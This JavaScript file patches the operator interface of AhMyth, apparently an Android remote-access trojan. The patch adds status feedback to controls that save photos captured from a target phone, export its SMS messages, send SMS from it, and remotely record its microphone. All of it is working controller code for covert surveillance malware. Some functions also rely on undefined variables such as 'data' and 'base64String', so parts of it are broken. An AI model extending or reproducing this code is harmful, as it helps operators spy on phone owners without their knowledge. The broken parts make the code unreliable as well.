// UX Improvements for AhMyth Server UI
// Thêm vào cuối file LabCtrl.js

// ==================== IMPROVED SAVE FUNCTIONS ====================

// Improved savePhoto with visual feedback
$camCtrl.savePhoto = () => {
    const saveBtn = document.querySelector('#savePhotoBtn');
    const originalText = saveBtn ? saveBtn.innerHTML : '';

    // Change button to "Saving..."
    if (saveBtn) {
        saveBtn.innerHTML = '<i class="spinner loading icon"></i> Saving...';
        saveBtn.classList.add('disabled');
    }

    $rootScope.Log('Saving picture..');
    var picPath = path.join(downloadsPath, Date.now() + ".jpg");

    fs.outputFile(picPath, new Buffer(base64String, "base64"), (err) => {
        if (!err) {
            $rootScope.Log('Picture saved on ' + picPath, CONSTANTS.logStatus.SUCCESS);

            // Change button to "Saved ✓"
            if (saveBtn) {
                saveBtn.innerHTML = '<i class="check icon"></i> Saved!';
                saveBtn.classList.remove('disabled');
                saveBtn.classList.add('green');

                // Revert back to "Save" after 2 seconds
                setTimeout(() => {
                    saveBtn.innerHTML = originalText || '<i class="save icon"></i> Save';
                    saveBtn.classList.remove('green');
                }, 2000);
            }
        } else {
            $rootScope.Log('Saving picture failed', CONSTANTS.logStatus.FAIL);

            // Change button to "Failed ✗"
            if (saveBtn) {
                saveBtn.innerHTML = '<i class="times icon"></i> Failed';
                saveBtn.classList.remove('disabled');
                saveBtn.classList.add('red');

                // Revert back after 2 seconds
                setTimeout(() => {
                    saveBtn.innerHTML = originalText || '<i class="save icon"></i> Save';
                    saveBtn.classList.remove('red');
                }, 2000);
            }
        }
    });
};

// Improved SaveSMS with visual feedback
$SMSCtrl.SaveSMS = () => {
    if ($SMSCtrl.smsList.length == 0) {
        $rootScope.Log('No SMS to save', CONSTANTS.logStatus.FAIL);
        return;
    }

    const saveBtn = document.querySelector('#saveSMSBtn');
    const originalText = saveBtn ? saveBtn.innerHTML : '';

    // Change button to "Saving..."
    if (saveBtn) {
        saveBtn.innerHTML = '<i class="spinner loading icon"></i> Saving...';
        saveBtn.classList.add('disabled');
    }

    var csvRows = [];
    for (var i = 0; i < $SMSCtrl.smsList.length; i++) {
        csvRows.push($SMSCtrl.smsList[i].phoneNo + "," + $SMSCtrl.smsList[i].msg);
    }

    var csvStr = csvRows.join("\\n");
    var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
    $rootScope.Log("Saving SMS List...");

    fs.outputFile(csvPath, csvStr, (error) => {
        if (error) {
            $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);

            if (saveBtn) {
                saveBtn.innerHTML = '<i class="times icon"></i> Failed';
                saveBtn.classList.remove('disabled');
                saveBtn.classList.add('red');

                setTimeout(() => {
                    saveBtn.innerHTML = originalText || '<i class="save icon"></i> Save SMS';
                    saveBtn.classList.remove('red');
                }, 2000);
            }
        } else {
            $rootScope.Log("SMS List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

            if (saveBtn) {
                saveBtn.innerHTML = '<i class="check icon"></i> Saved!';
                saveBtn.classList.remove('disabled');
                saveBtn.classList.add('green');

                setTimeout(() => {
                    saveBtn.innerHTML = originalText || '<i class="save icon"></i> Save SMS';
                    saveBtn.classList.remove('green');
                }, 2000);
            }
        }
    });
};

// Improved SendSMS with better feedback
$SMSCtrl.SendSMS = (phoneNo, msg) => {
    if (!phoneNo || !msg) {
        $rootScope.Log('Phone number and message are required', CONSTANTS.logStatus.FAIL);
        return;
    }

    const sendBtn = document.querySelector('#sendSMSBtn');
    const originalText = sendBtn ? sendBtn.innerHTML : '';

    // Change button to "Sending..."
    if (sendBtn) {
        sendBtn.innerHTML = '<i class="spinner loading icon"></i> Sending...';
        sendBtn.classList.add('disabled');
    }

    $rootScope.Log('Sending SMS to ' + phoneNo + '...');
    socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });

    // Listen for response
    socket.once('sms_sent', (data) => {
        if (data.success) {
            $rootScope.Log('SMS sent successfully', CONSTANTS.logStatus.SUCCESS);

            if (sendBtn) {
                sendBtn.innerHTML = '<i class="check icon"></i> Sent!';
                sendBtn.classList.remove('disabled');
                sendBtn.classList.add('green');

                setTimeout(() => {
                    sendBtn.innerHTML = originalText || '<i class="send icon"></i> Send SMS';
                    sendBtn.classList.remove('green');
                }, 2000);
            }
        } else {
            $rootScope.Log('SMS not sent: ' + (data.error || 'Unknown error'), CONSTANTS.logStatus.FAIL);

            if (sendBtn) {
                sendBtn.innerHTML = '<i class="times icon"></i> Failed';
                sendBtn.classList.remove('disabled');
                sendBtn.classList.add('red');

                setTimeout(() => {
                    sendBtn.innerHTML = originalText || '<i class="send icon"></i> Send SMS';
                    sendBtn.classList.remove('red');
                }, 2000);
            }
        }
    });

    // Timeout after 10 seconds
    setTimeout(() => {
        if (sendBtn && sendBtn.classList.contains('disabled')) {
            sendBtn.innerHTML = '<i class="times icon"></i> Timeout';
            sendBtn.classList.remove('disabled');
            sendBtn.classList.add('orange');

            setTimeout(() => {
                sendBtn.innerHTML = originalText || '<i class="send icon"></i> Send SMS';
                sendBtn.classList.remove('orange');
            }, 2000);
        }
    }, 10000);
};

// Improved Microphone Recording with progress bar
$MicCtrl.Record = (seconds) => {
    if (!seconds || seconds <= 0) {
        $rootScope.Log('Seconds must be more than 0', CONSTANTS.logStatus.FAIL);
        return;
    }

    const recordBtn = document.querySelector('#recordBtn');
    const progressBar = document.querySelector('#recordProgress');
    const progressLabel = document.querySelector('#recordProgressLabel');

    // Disable button
    if (recordBtn) {
        recordBtn.classList.add('disabled');
        recordBtn.innerHTML = '<i class="microphone icon"></i> Recording...';
    }

    // Show progress bar
    if (progressBar) {
        progressBar.style.display = 'block';
        progressBar.querySelector('.bar').style.width = '0%';
    }

    $rootScope.Log('Recording ' + seconds + " seconds...");
    socket.emit(ORDER, { order: mic, sec: seconds });

    // Simulate progress
    let elapsed = 0;
    const interval = setInterval(() => {
        elapsed += 0.1;
        const progress = Math.min((elapsed / seconds) * 100, 100);

        if (progressBar) {
            progressBar.querySelector('.bar').style.width = progress + '%';
        }

        if (progressLabel) {
            progressLabel.textContent = Math.floor(seconds - elapsed) + 's remaining';
        }

        if (elapsed >= seconds) {
            clearInterval(interval);

            if (progressLabel) {
                progressLabel.textContent = 'Waiting for audio...';
            }
        }
    }, 100);

    // Store interval for cleanup
    $MicCtrl.recordingInterval = interval;
};

// Improved SaveAudio with visual feedback
$MicCtrl.SaveAudio = () => {
    const saveBtn = document.querySelector('#saveAudioBtn');
    const originalText = saveBtn ? saveBtn.innerHTML : '';

    // Change button to "Saving..."
    if (saveBtn) {
        saveBtn.innerHTML = '<i class="spinner loading icon"></i> Saving...';
        saveBtn.classList.add('disabled');
    }

    $rootScope.Log('Saving audio file...');
    var filePath = path.join(downloadsPath, data.name);

    fs.outputFile(filePath, data.buffer, (err) => {
        if (err) {
            $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);

            if (saveBtn) {
                saveBtn.innerHTML = '<i class="times icon"></i> Failed';
                saveBtn.classList.remove('disabled');
                saveBtn.classList.add('red');

                setTimeout(() => {
                    saveBtn.innerHTML = originalText || '<i class="save icon"></i> Save Audio';
                    saveBtn.classList.remove('red');
                }, 2000);
            }
        } else {
            $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);

            if (saveBtn) {
                saveBtn.innerHTML = '<i class="check icon"></i> Saved!';
                saveBtn.classList.remove('disabled');
                saveBtn.classList.add('green');

                setTimeout(() => {
                    saveBtn.innerHTML = originalText || '<i class="save icon"></i> Save Audio';
                    saveBtn.classList.remove('green');
                }, 2000);
            }
        }
    });
};

// Cleanup recording interval on audio arrival
socket.on(mic, (data) => {
    if (data.file == true) {
        // Clear recording interval
        if ($MicCtrl.recordingInterval) {
            clearInterval($MicCtrl.recordingInterval);
        }

        // Hide progress bar
        const progressBar = document.querySelector('#recordProgress');
        if (progressBar) {
            progressBar.style.display = 'none';
        }

        // Enable record button
        const recordBtn = document.querySelector('#recordBtn');
        if (recordBtn) {
            recordBtn.classList.remove('disabled');
            recordBtn.innerHTML = '<i class="microphone icon"></i> Record';
        }

        $rootScope.Log('Audio arrived', CONSTANTS.logStatus.SUCCESS);

        // ... rest of the existing code ...
    }
});

// ==================== HELPER FUNCTIONS ====================

// Generic save button feedback
function updateSaveButton(buttonSelector, state, message) {
    const btn = document.querySelector(buttonSelector);
    if (!btn) return;

    const originalText = btn.getAttribute('data-original-text') || btn.innerHTML;
    btn.setAttribute('data-original-text', originalText);

    switch (state) {
        case 'saving':
            btn.innerHTML = '<i class="spinner loading icon"></i> ' + (message || 'Saving...');
            btn.classList.add('disabled');
            break;
        case 'success':
            btn.innerHTML = '<i class="check icon"></i> ' + (message || 'Saved!');
            btn.classList.remove('disabled');
            btn.classList.add('green');
            setTimeout(() => {
                btn.innerHTML = originalText;
                btn.classList.remove('green');
            }, 2000);
            break;
        case 'error':
            btn.innerHTML = '<i class="times icon"></i> ' + (message || 'Failed');
            btn.classList.remove('disabled');
            btn.classList.add('red');
            setTimeout(() => {
                btn.innerHTML = originalText;
                btn.classList.remove('red');
            }, 2000);
            break;
    }
}
